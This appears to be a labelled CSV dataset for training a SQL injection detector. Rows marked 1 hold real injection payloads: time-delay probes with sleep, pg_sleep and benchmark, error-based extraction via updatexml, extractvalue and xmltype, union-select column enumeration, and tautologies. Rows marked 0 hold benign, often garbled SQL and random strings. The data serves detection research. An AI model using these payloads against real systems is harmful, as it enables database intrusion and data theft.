Query,Label
"1   )    )    as rual where 4649  =  4649 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"INSERT INTO proud  ( copper, area, lift )  VALUES  ( 'successful', 'throat', 'oil' )  ",0
" select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",1
-1549'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'fnwx'  =  'fnwx,1
SELECT * FROM engineer WHERE    NOT slowly = 'canal',0
"   SELECT adult, just, slowFROM agree WHERE go  IS NOT NULL",0
46842,0
"1   )    )     )   union all select null,null,null,null,null,null,null,null--",1
SELECT Count ( * )  AS mine,0
SELECT * FROM any  WHERE brother NOT LIKE '[roll]%',0
erny1,0
"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1
pardos@barcafedaniss.co,0
SELECT * FROM meant FETCH FIRST 50 PERCENT ROWS ONLY,0
19583,0
"1%""   )    )    and sleep  (  5  )  #",1
5719,0
gracindo@ajuntamentbcn2-0.jp,0
1'||  (  select 'ogyu' from dual where 6691  =  6691,1
SELECT COUNT ( author ) FROM bear,0
1'||  (  select 'qdkb' where 4331  =  4331,1
SELECT AVG ( though ) FROM making SELECT SUM ( cowboy ) ,0
SELECT AVG ( Price ) FROM breathe,0
 (  select   (  case when   (  5792  =  5792  )   then 5792 else 1/  (  select 0  )   end   )    ) ,1
96761343k,0
"1 where 3410  =  3410 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT TOP 3 * FROM fewer WHERE spend = 'library',0
"-9272%""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""%""  =  """,1
SELECT movie ( s FROM running RIGHT JOIN,0
"-6007""   )    )    union all select 6019,6019,6019,6019,6019,6019,6019,6019--",1
1%'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  '%'  =  ',1
73361115q,0
" SELECT * FROM represent ORDER BY thirty ASC, they DESC",0
"1' in boolean mode  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #",1
DELETE FROM married WHERE suppose = 'local',0
1'||  (  select 'vwls' where 5252  =  5252 rlike sleep  (  5  )  #,1
"1""  )   where 2922  =  2922 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh",1
SELECT AVG ( lower )  FROM lunch  SELECT SUM ( time ) ,0
-8615   )    )     )   or 4039  =  9144,1
"   SELECT desert, bell+ ', ' + immediately+ ' ' + fell+ ', ' + stairs AS lungs  FROM lift",0
1'   )    )    as plbt where 4368  =  4368 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
SELECT you ( s )  FROM own UNION ALL,0
"1   )    )     )   union all select null,null,null,null,null,null,null,null,null#",1
"1%""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""%""  =  """,1
SELECT * FROM period,0
"-3672""   )    )    union all select 6093#",1
1'   )    )     )   and 6991  =  5579,1
1052,0
SELECT TOP 3 * FROM coach WHERE strike = 'split' SELECT * FROM fellow,0
1%' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
SELECT * FROM yes WHERE strength NOT BETWEEN 'country' AND 'tie',0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""pxbk"" like ""pxbk",1
pelland,0
DELETE FROM slope,0
SELECT COUNT ( actual ) FROM neck,0
SELECT * FROM  ( SELECT powerful FROM everyone ) ,0
SELECT ago ( s FROM master RIGHT JOIN,0
SELECT * FROM end 3,0
SELECT FLOOR ( RAND (  ) * ( 10-5+1 ) +5 ) ;,0
1 where 7442  =  7442,1
"1'||  (  select 'jpso' from dual where 9357  =  9357 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",1
"   SELECT teeth, steam, frighten FROM size WHERE am  IS NULL",0
open3,0
11640,0
"1%""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""%""  =  """,1
etchieso,0
brazzel1@castigadas.am,0
SELECT * FROM cannot FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM itself,0
8.0957E+15,0
registro,0
serret@sierradealcaraz.dj,0
"1""  )   where 7914  =  7914 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
SELECT TOP 3 * FROM idea,0
argecilla,0
SELECT COUNT ( movieID ) FROM each,0
SELECT * FROM square WHERE value BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM dance ORDER BY dark,0
SELECT option_value FROM wp_options WHERE option_name  =  'sm_on_fly' LIMIT 1,0
aula,0
"  SELECT * FROM dollar WHERE right NOT IN  ( 'inside', 'dear', 'melted' )  ",0
"   SELECT COUNT ( underline ) , flow FROM will BY spirit",0
SELECT * FROM cave WHERE card BETWEEN '1996-07-01' AND '1996-07-31',0
"   SELECT Employees.carbon, COUNT ( Orders.viewID )  AS dugFROM    ( OrdersINNER JOIN constantly ON Orders.islandID  =  Employees.blockID ) ",0
7.77E+15,0
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'wp_theme' )  AND t.name IN  ( 'houzez-child' ) ",0
SELECT * FROM thy FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM wing WHERE captain = 'man' LIMIT 3,0
guciz,0
"calle bir ganduz, 90",0
5.77329E+15,0
-2783%'   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   '%'  =  ',1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3# sfup",1
SELECT * FROM travel WHERE claws NOT LIKE 'escape%',0
medel pujolriu,0
select   (  case when   (  5464  =  9350  )   then 5464 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
"1""  )   as ipxg where 4031  =  4031 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
48710,0
1'  )   as sruz where 6318  =  6318,1
agn,0
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1
or 'unusual'   =   'unusual',1
"   SELECT cap, meal, hungry FROM captured WHERE pony  IS NULL",0
SELECT TOP 3 * FROM influence WHERE rear = 'straight' SELECT * FROM specific,0
SELECT * FROM quick,0
"   SELECT pick,peace,available,seems,above     (  (  wing JOIN younger ON wrapped.on =  doubt.tobacco )   INNER JOIN influenceON Orders.sit =  highway.inID ) ",0
"1'   )    )    as mdtm where 1393  =  1393 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"  SELECT circle,father,us FROM avoid LEFT JOIN Orders ON different.representID =  spoken.putting ORDER BY chance.rice",0
"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",1
SELECT TOP 3 * FROM half SELECT * FROM main 3SELECT * FROM expect,0
"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
-8465' where 5242  =  5242 or 3806  =  7423--,1
select   (  case when   (  8362  =  7572  )   then 8362 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
callosar,0
-9840'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'dzlp'  =  'dzlp,1
"1""  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""wfwg"" like ""wfwg",1
DELETE FROM fewer,0
1 and   (  1977  =  6852  )  *6852-- clxl,1
"1'||  (  select 'ltqo' where 9080  =  9080 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1
"INSERT INTO mine  ( yourself, shelf, rest )  VALUES  ( 'melted', 'area', 'forgotten' )  ",0
SELECT * FROM remove WHERE indicate BETWEEN copper09/01/1996them AND easier15/31/1996couple,0
SELECT * FROM development ORDER BY load DESC,0
"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1"" order by 1--",1
torrente zaldvar,0
SELECT MIN ( saw )  AS instance FROM either,0
SELECT COUNT ( forgot ) FROM gun,0
vilma,0
scott,0
SELECT TOP 50 PERCENT * FROM act,0
3.15402E+15,0
SELECT AVG ( recently ) FROM alive SELECT SUM ( fine ) ,0
SELECT * FROM college ORDER BY jar DESC,0
1'1,1
"1'   )    )    as jpxj where 6153  =  6153 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1""   )    )    as paep where 8947  =  8947 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
SELECT these ( s )  FROM within UNION,0
"SELECT * FROM parts WHERE storm BETWEEN ""part"" AND    ""tears""",0
25g0a00,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5fbce94a85edc' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
"  UPDATE same SET proud =  'cookies', City =  'act' WHERE studied =  breeze",0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""seci""  =  ""seci",1
1'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  'nhrc' like 'nhrc,1
SELECT AVG ( musical ) FROM dead SELECT SUM ( road ) ,0
 UPDATE thread SET tool = 'surprise'WHERE fighting = 'clothes',0
1  )   order by 1--,1
DELETE FROM interest,0
1'  )   as fksm where 9714  =  9714,1
"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""wdye"" like ""wdye",1
roni,0
-2866'   )    )    or 4491  =  9429#,1
SELECT * FROM labor WHERE Price NOT BETWEEN 10 AND 20,0
"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1
"  SELECT sport AS lie, kind AS [canal]  FROM current",0
" SELECT * FROM driving ORDER BY ants, inside",0
SELECT * FROM leave WHERE count BETWEEN 'yourself' AND 'group',0
SELECT * FROM noise ORDER BY president DESC,0
" select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1
SELECT strike,0
"1   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
1'||  (  select 'zyvk' from dual where 2072  =  2072,1
SELECT pain FROM stepped,0
"1"" or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1
1'||  (  select 'aojt' from dual where 8499  =  8499,1
1'+  (  select 'njee' where 4101  =  4101 and 3090  =  7873  )  +',1
"-2377%'   )    )     )   union all select 7706,7706--",1
5.62626E+14,0
errol@diseodesoftware.ml,0
pompa,0
SELECT atmosphere ( s )  FROM trap UNION,0
einar,0
"1'  )   as ezoa where 4915  =  4915 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM dinner ORDER BY also DESC,0
SELECT AVG ( cat )  FROM traffic  SELECT SUM ( percent ) ,0
SELECT * FROM form  WHERE apple NOT LIKE '[additional]%',0
"1%""   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  ""%""  =  """,1
59137152n,0
"c/ honduras, 139 7-a",0
"1' in boolean mode  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT option_value FROM wp_options WHERE option_name  =  'options_number_of_preferred_partners' LIMIT 1,0
polop,0
SELECT * FROM tax WHERE NOT move = 'probably'  AND NOT neck = 'strange',0
1%'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
SELECT park ( s )  FROM contrast LEFT JOIN,0
"1%""   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   ""%""  =  """,1
SELECT * FROM area WHERE Price NOT BETWEEN 10 AND 20,0
cartaya,0
SELECT * FROM clothes WHERE Price NOT BETWEEN 10 AND 20,0
SELECT road ( s )  FROM middle SELECT rice FROM broke,0
SELECT * FROM star WHERE Price NOT BETWEEN 10 AND 20,0
SELECT COUNT ( fall ) FROM gift,0
s4dsudeste,0
"1'+  (  select nzij where 5456  =  5456 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   +'",1
SELECT somewhere,0
"-2570"" or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""dmch"" like ""dmch",1
"1'||  (  select 'nzjz' where 3539  =  3539 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
prueckner@helicopter.com.gf,0
sleep 50',1
"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  # dyed",1
SELECT * FROM gray,0
"   SELECT sound, pleasure, you FROM surface WHERE strength  IS NULL",0
"1""  )   as ktnq where 9005  =  9005",1
"   SELECT itself, stood, protection FROM how WHERE mountain  IS NULL",0
SELECT COUNT ( broke )  FROM zulu,0
SELECT * FROM peace WHERE outline = 'scared' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM knife WHERE action NOT LIKE 'atmosphere%',0
azorin 35 1b,0
" select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""%""  =  """,1
"1' where 8969  =  8969 union all select null,null,null,null,null--",1
philip7,0
UEs,1
SELECT MIN ( stiff )  AS salt FROM plane,0
"1 where 4448  =  4448 union all select null,null,null,null,null#",1
22268,0
SELECT COUNT ( cross )  FROM grabbed,0
SELECT told ( s )  FROM bring FULL OUTER JOIN,0
"1'  )   where 7887  =  7887 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
-9072  )   as saot where 2278  =  2278 order by 1#,1
3.82074E+15,0
"1  )   as cejp where 4736  =  4736 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM lose WHERE hour = 'distance',0
"-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd",1
"1   )    )    as jfae where 6684  =  6684 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT * FROM perfectly WHERE describe = 'fairly' FETCH FIRST 3 ROWS ONLY,0
81568460h,0
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",1
"1%' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and '%'  =  '",1
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE t.term_id  =  716",0
"1'+  (  select xlvq where 7470  =  7470 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",1
" select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",1
"  SELECT Orders.streamrID, Employees.run, Employees.wear FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.catID ORDER BY Orders.unusualID",0
"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""hiwo"" like ""hiwo",1
